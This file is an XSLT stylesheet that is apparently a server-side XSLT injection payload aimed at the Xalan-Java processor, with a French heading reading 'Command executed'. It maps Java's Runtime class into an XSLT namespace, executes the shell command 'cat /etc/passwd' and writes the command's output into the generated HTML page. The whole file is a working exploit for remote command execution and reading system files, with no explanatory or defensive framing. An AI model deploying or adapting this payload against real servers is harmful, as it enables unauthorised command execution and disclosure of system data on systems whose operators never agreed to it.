<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
  exclude-result-prefixes="rt ob">

  <xsl:template match="/">
    <html>
      <body>
        <h2>Commande exécutée :</h2>
        <pre>
          <xsl:variable name="cmd" select="'cat /etc/passwd'" />
          <xsl:variable name="exec" select="rt:exec($cmd)" />
          <xsl:variable name="input" select="ob:getInputStream($exec)" />
          <xsl:copy-of select="document($input)" />
        </pre>
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
